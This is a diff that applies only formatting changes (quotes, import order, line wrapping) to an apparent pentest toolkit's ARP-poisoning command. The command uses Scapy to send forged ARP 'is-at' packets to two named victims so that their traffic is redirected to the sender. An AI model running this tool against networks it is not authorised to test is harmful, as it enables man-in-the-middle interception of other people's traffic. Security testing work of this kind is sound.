@@ -7,15 +7,16 @@ import click
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from habu.lib.iface import search_iface
 from scapy.all import ARP, Ether, conf, getmacbyip, sendp
+
+from habu.lib.iface import search_iface
 
 
 @click.command()
-@click.argument('victim1')
-@click.argument('victim2')
-@click.option('-i', 'iface', default=None, help='Interface to use')
-@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
+@click.argument("victim1")
+@click.argument("victim2")
+@click.option("-i", "iface", default=None, help="Interface to use")
+@click.option("-v", "verbose", is_flag=True, default=False, help="Verbose")
 def cmd_arp_poison(victim1, victim2, iface, verbose):
     """Send ARP 'is-at' packets to each victim, poisoning their
     ARP tables for send the traffic to your system.
@@ -41,16 +42,20 @@ def cmd_arp_poison(victim1, victim2, iface, verbose):
     if iface:
         iface = search_iface(iface)
         if iface:
-            conf.iface = iface['name']
+            conf.iface = iface["name"]
         else:
-            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            logging.error(
+                "Interface {} not found. Use habu.interfaces to show valid network interfaces".format(
+                    iface
+                )
+            )
             return False
 
     mac1 = getmacbyip(victim1)
     mac2 = getmacbyip(victim2)
 
-    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=victim2, pdst=victim1, hwdst=mac1)
-    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=victim1, pdst=victim2, hwdst=mac2)
+    pkt1 = Ether(dst=mac1) / ARP(op="is-at", psrc=victim2, pdst=victim1, hwdst=mac1)
+    pkt2 = Ether(dst=mac2) / ARP(op="is-at", psrc=victim1, pdst=victim2, hwdst=mac2)
 
     try:
         while 1:
@@ -69,5 +74,6 @@ def cmd_arp_poison(victim1, victim2, iface, verbose):
     except KeyboardInterrupt:
         pass
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     cmd_arp_poison()
